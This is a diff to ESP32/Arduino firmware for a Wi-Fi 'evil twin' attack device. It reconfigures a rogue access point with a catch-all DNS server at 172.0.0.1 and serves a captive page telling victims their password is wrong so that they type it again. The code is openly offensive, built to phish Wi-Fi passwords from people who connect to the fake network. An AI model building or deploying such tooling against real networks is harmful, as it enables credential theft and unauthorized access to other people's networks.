@@ -33,7 +33,7 @@ Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &SPI, OLED_DC, OLED_RESET,
 
 
 const byte DNS_PORT = 53;
-IPAddress apIP(192, 168, 1, 1);
+IPAddress apIP(172, 0, 0, 1);
 DNSServer dnsServer;
 WebServer webServer(80);
 
@@ -170,17 +170,11 @@ void acceptEvilTwinOrderOrFinishSignal(int numBytes) {
           display.display();
 
           //start main evil twin access point:
-          // dnsServer.stop();
-          // WiFi.softAPdisconnect(true);
-          // WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
-          // WiFi.softAP(evilAPName);
-          // dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
 
-
-          WiFi.mode(WIFI_AP_STA);
-          WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
+          WiFi.mode(WIFI_AP);
+          WiFi.softAPConfig(IPAddress(172, 0, 0, 1), IPAddress(172, 0, 0, 1), IPAddress(255, 255, 255, 0));
           WiFi.softAP(evilAPName);
-          dnsServer.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));
+          dnsServer.start(DNS_PORT, "*", IPAddress(172, 0, 0, 1));
           WiFi.disconnect();
 
           webServer.on("/", handleIndex);
@@ -222,16 +216,6 @@ void setup() {
   display.display();
   delay(100);
 
-  // WiFi.mode(WIFI_AP_STA);
-  // WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
-  // WiFi.softAP("Service");
-  // dnsServer.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));
-  // WiFi.disconnect();
-
-  // webServer.on("/", handleIndex);
-  // webServer.on("/result", handleResult);
-  // webServer.onNotFound(handleIndex);
-  // webServer.begin();
 }
 
 void handleResult() {
@@ -240,7 +224,6 @@ void handleResult() {
 
     webServer.send(200, "text/html", "<html><head><script> setTimeout(function(){window.location.href = '/';}, 10000); </script><meta name='viewport' content='initial-scale=1.0, width=device-width'><body><center><h2><wrong style='text-shadow: 1px 1px black;color:red;font-size:60px;width:60px;height:60px'>&#8855;</wrong><br>Wrong Password</h2><p>Please, try again.</p></center></body> </html>");
     Serial.println("Handle result called when missionSuccessful==0...");
-    //TODO clear pass!
 
     display.clearDisplay();
     display.setCursor(0, 0);
